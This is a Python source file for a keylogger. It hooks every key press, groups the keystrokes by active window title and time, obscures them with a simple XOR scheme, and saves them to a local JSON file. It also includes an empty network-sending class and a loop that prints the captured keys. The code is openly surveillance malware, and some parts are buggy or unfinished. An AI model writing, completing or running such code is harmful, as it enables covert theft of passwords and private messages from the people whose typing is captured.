from time import strftime
import json
import keyboard
import pygetwindow as pw
from abc import ABC,abstractmethod
from datetime import datetime
import time
import threading

class KeyLoggerService:

    '''
    this class contain all the function for the key board service
    it's listen for all the keyword and stored in temp DB
    '''

    def __init__(self):
        self.data = {}
        self._get_keyword()

    def get_data(self):
        data = self.data.copy()
        self.data.clear()
        return data

    def _get_keyword(self):
        def _callback(key):
            active_window = self._get_active_window()
            if active_window not in self.data:
                self.data[active_window] = {}
            current_time = self._get_time()
            if current_time not in self.data[active_window]:
                self.data[active_window][current_time] = ""
            self.data[active_window][current_time] += key.name
        
        keyboard.on_press(_callback)

    def _get_active_window(self):
        try:
            return pw.getActiveWindow().title
        except:
            return "unknown window"

    def _get_time(self):
        return datetime.strftime(datetime.now(),"%Y-%m-%d %H:%M")

class Writer(ABC):

    def __init__(self):
        pass

    @abstractmethod
    def write(self,data):
        pass

class FileWriter(Writer):

    def write(self,data):
        try:
            with open("DB.json",'r') as file:
                origin_data = json.load(file)
        except:
            origin_data = {}

        origin_data.update(data)

        with open("DB.json",'w') as file:
            json.dump(origin_data,file,indent=4)


class NetworkWriter(Writer):

    def write(self,data):
        pass


class Encryptor:

    def __init__(self):
        self.crypto_key = "g"
        self.mode = 1

    def _xor_help(self,value):
        new_value = "".join([chr((ord(self.crypto_key) ^ ord(i)) + (65 * self.mode)) for i in value])
        return new_value

    def xor(self,data):

        encrypted_data = {}
        for window_key,value in data.items():
            new_window = self._xor_help(window_key)
            encrypted_data[new_window] = {}
            for key_data,value_str in data:
                new_data = self._xor_help(key_data)
                new_str = self._xor_help(value_str)
                encrypted_data[new_window][new_data] = new_str

        return encrypted_data

    def _decrypto_xor(self,data):
        self.mode = -1
        decrypto_data = self.xor(data)
        self.mode = 1
        return decrypto_data

class KeyloggerManager:

    def __init__(self):
        self.keylogger_service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor = Encryptor()
        self.keylogger_thread = threading.Thread(target=self._get_data_from_keylogger)
        self.keylogger_thread.start()
        self.data = None

    def _get_data_from_keylogger(self):
        while True:
            time.sleep(5)
            data = self.keylogger_service.get_data()
            encrypt_data = self.encryptor.xor(data)
            self.file_writer.write(encrypt_data)

    def exit(self):
        self.keylogger_thread.join()


key = KeyLoggerService()
while True:
    time.sleep(5)
    print(key.get_data())